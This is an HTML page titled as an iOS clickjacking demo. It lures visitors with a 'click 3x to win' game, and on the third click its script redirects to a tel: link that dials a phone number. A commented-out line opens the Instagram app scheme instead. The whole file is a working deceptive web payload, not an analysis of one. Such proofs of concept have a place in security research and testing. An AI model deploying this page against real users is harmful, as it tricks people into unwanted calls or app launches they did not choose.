<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>iOS Clickjacking Demo</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
      font-family: sans-serif;
    }

    #redBox {
      position: absolute;
      top: 20px;
      right: 20px;
      width: 40px;
      height: 40px;
      background-color: red;
      cursor: pointer;
    }

    #counter {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 32px;
    }
  </style>
</head>
<body>

<div id="redBox"></div>
<div id="counter">Click 3x the red box to win!</div>

<script>
let clickCount = 0;

document.getElementById("redBox").onclick = () => {
  clickCount++;
  document.getElementById("counter").innerText = "x" + clickCount;

  // final click → trigger app
  if (clickCount === 3) {
    // pilih salah satu:
    // window.location = "instagram://app";
    window.location = "tel:+6281234567890";
  }
};
</script>

</body>
</html>
